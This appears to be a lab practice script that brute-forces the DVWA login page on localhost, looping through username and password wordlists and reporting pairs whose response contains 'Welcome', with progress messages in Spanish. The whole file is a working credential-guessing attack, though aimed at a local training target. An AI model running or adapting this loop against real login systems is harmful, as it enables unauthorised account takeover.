import requests
import time

with open("xato-net-10-million-passwords-150.txt", "r", encoding="utf-8") as file:
	passwords = []
	for line in file:
		passwords.append(line.strip())

with open("xato-net-10-million-usernames-2500.txt", "r", encoding="utf-8") as file:
        usernames = []
        for line in file:
                usernames.append(line.strip())

string_to_check = "Welcome"

lab_cookies = {
	"PHPSESSID": "c064546f2b39f57fe0ef98621fedfce2",
	"security": "low"
}

intentos = 0
tiempo_inicio = time.time()

for user in usernames:
	for passw in passwords:
		response = requests.get(f"http://localhost:4280/vulnerabilities/brute/?username={user}&password={passw}&Login=Login", cookies=lab_cookies)
		# print(f"probando {user}:{passw}")

		intentos += 1

		if intentos % 1250 == 0:
			tiempo_actual = time.time()
			tiempo_transcurrido = tiempo_actual - tiempo_inicio
			intentos_x_minuto = (intentos / tiempo_transcurrido) * 60
			print(f"{intentos} peticiones en total | velocidad: {int(intentos_x_minuto)} intentos/minuto")

		if string_to_check in response.text:
			print(f"--------------------valido: {user}:{passw}--------------------------")

